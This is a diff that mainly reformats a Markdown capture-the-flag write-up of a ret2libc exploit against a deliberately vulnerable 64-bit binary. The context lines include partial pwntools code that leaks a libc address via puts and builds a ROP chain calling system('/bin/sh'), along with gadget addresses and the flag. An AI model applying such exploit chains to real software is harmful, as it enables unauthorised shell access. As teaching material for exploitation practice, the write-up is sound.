@@ -8,21 +8,22 @@ summary: A detailed write-up of the `ret2libc` exploit technique, including its 
 
 ## Table of Contents
 
-* [Challenge Description](#challenge-description)
-* [Files Provided](#files-provided)
-* [Challenge Overview](#challenge-overview)
-* [Step 1: Analyzing the Binary](#step-1-analyzing-the-binary)
-* [Step 2: Finding Overflow Offset](#step-2-finding-overflow-offset)
-* [Step 3: Preparing ROP Gadgets](#step-3-preparing-rop-gadgets)
-* [Step 4: Leaking libc Address](#step-4-leaking-libc-address)
-* [Step 5: Calculating libc Base](#step-5-calculating-libc-base)
-* [Step 6: Crafting Final ret2libc Payload](#step-6-crafting-final-ret2libc-payload)
-* [Step 7: Exploitation and Flag](#step-7-exploitation-and-flag)
-* [Conclusion](#conclusion)
+- [Challenge Description](#challenge-description)
+- [Files Provided](#files-provided)
+- [Challenge Overview](#challenge-overview)
+- [Step 1: Analyzing the Binary](#step-1-analyzing-the-binary)
+- [Step 2: Finding Overflow Offset](#step-2-finding-overflow-offset)
+- [Step 3: Preparing ROP Gadgets](#step-3-preparing-rop-gadgets)
+- [Step 4: Leaking libc Address](#step-4-leaking-libc-address)
+- [Step 5: Calculating libc Base](#step-5-calculating-libc-base)
+- [Step 6: Crafting Final ret2libc Payload](#step-6-crafting-final-ret2libc-payload)
+- [Step 7: Exploitation and Flag](#step-7-exploitation-and-flag)
+- [Conclusion](#conclusion)
 
 ---
 
 ## Challenge Description
+
 There was a very kind author living in the digital world. He
 created a unique helper programme that was supposed to
 make life easier for other developers. In his boundless
@@ -37,9 +38,9 @@ left the door to his house wide open, hanging a sign on it saying
 
 ## Files Provided:
 
-- `KindAuthor` (binary)  
-- `libc.so.6`  
-- `ld-linux-x86-64.so.2`  
+- `KindAuthor` (binary)
+- `libc.so.6`
+- `ld-linux-x86-64.so.2`
 
 ---
 
@@ -49,7 +50,7 @@ The challenge is a 64-bit ELF binary with the following properties:
 
 ```text
 Partial RELRO | No Canary | NX Enabled | No PIE | Not stripped
-````
+```
 
 The binary prompts:
 
@@ -73,7 +74,6 @@ checksec --file=KindAuthor
 ```
 
 ![Checksec Results](/static/images/JuniorCrypt/checksec.png)
-
 
 **Results:**
 
@@ -117,7 +117,6 @@ Offset to RIP: 40 bytes
 
     ![Overflow Offset](/static/images/JuniorCrypt/cyclic2.png)
 
-
 **Payload Layout:**
 
 ```
@@ -142,8 +141,8 @@ ROPgadget --binary KindAuthor | grep "pop rdi"
 pop_rdi = 0x000000000040114a
 ```
 
-* This will pop out anything in `RDI` and allow us to control the first argument of any function we call.
-* We can pass the address of `puts` for leaking `libc`.
+- This will pop out anything in `RDI` and allow us to control the first argument of any function we call.
+- We can pass the address of `puts` for leaking `libc`.
 
 ---
 
@@ -161,7 +160,7 @@ io = process()
 puts = elf.got.puts # `GOT` entry for `puts`
 main = elf.sym.main # Entry point for `main`
 
-payload = cyclic(40) 
+payload = cyclic(40)
 payload += pack(pop_rdi)
 payload += pack(puts)
 payload += pack(elf.sym.puts)
@@ -179,7 +178,6 @@ log.success(f"Leaked `puts@libc`: {hex(leaked_addr)}")
 ---
 
 ## Step 5: Calculating libc Base
-
 
 Using offsets from `libc.so.6`:
 
@@ -200,7 +198,6 @@ objdump -T libc.so.6 | grep system
 ```
 
 ![Puts Libc](/static/images/JuniorCrypt/system_libc.png)
-
 
     - A `ret` gadget for stack alignment:
 
@@ -225,7 +222,7 @@ ret       = 0x401016                   # ret gadget for alignment
 
 ```python
 
-payload = cyclic(40) # Overflow 
+payload = cyclic(40) # Overflow
 payload += pack(pop_rdi) # Control `RDI`
 payload += pack(bin_sh) # Set `RDI` to "/bin/sh"
 payload += pack(ret) # Align stack
@@ -294,17 +291,16 @@ grodno {bL491M1_N4M3R3n1Y4m1_VYm05ch3n4_d0R094_v_5h31L}
 
 ## Conclusion
 
-* The challenge used a **classic buffer overflow** with **`ret2libc` exploitation**.
-* **No PIE**, **NX enabled**, and **no canary** made it straightforward.
-* **Step-by-step approach:**
+- The challenge used a **classic buffer overflow** with **`ret2libc` exploitation**.
+- **No PIE**, **NX enabled**, and **no canary** made it straightforward.
+- **Step-by-step approach:**
 
-
-    1. **Identify overflow**
-    2. **Determine offset**
-    3. **Leak libc address**
-    4. **Calculate libc base**
-    5. **Build final ROP chain**
-    6. **Spawn shell and read flag**
+  1. **Identify overflow**
+  2. **Determine offset**
+  3. **Leak libc address**
+  4. **Calculate libc base**
+  5. **Build final ROP chain**
+  6. **Spawn shell and read flag**
 
 > This writeup demonstrates a clean **beginner-friendly `ret2libc` exploitation workflow**.
 
